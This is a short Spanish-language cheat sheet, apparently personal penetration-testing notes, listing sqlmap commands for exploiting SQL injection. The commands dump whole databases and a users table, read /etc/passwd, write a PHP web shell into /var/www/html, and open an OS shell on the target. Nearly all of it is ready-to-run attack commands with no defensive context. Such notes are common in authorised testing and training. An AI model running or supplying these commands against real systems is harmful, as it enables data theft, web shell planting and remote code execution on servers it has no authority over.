# Modos de uso
1. Ponerle un * al parametro que encontramos vulnerable, tambien peude ser una cookie
```
sqlmap -r req --dbs --dump --batch --level 5 --risk 3 --prefix="')" --suffix="-- -"
sqlmap -r req --dbs --dump --batch --level 5 --risk 3 --prefix="%'))" --suffix="-- -"
```
2. SI la pagina no acepta muchas peticiones poner DELAY
```
sqlmap -r req --dbs --dump --batch --delay=2
```
3. Para enumerar
```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
4. Para ver si tiene opciones de read o create files
```
sqlmap -r req --dbs --dump --batch --current-user --current-db --is-dba
```
4.1 Leyendo archivos
```
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```
4.2 Escribiendo archivos
```
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
4.3 RCE
```
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
